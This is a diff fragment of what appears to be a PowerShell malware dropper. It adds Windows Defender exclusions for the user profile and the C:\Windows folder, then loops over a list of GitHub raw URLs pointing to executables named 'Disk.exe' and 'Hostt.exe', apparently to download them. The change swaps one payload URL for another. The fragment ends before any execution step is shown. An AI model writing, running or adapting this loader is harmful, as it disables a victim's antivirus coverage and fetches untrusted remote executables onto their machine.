@@ -2,7 +2,7 @@ Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
 $urls = @(
     "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Disk.exe",
-    "https://github.com/UNKNOWHATIDENTIFIED/deoxyz/raw/refs/heads/main/111.exe"
+    "https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/Hostt.exe"
 )
 foreach ($url in $urls) {
     $fileName = Split-Path $url -Leaf
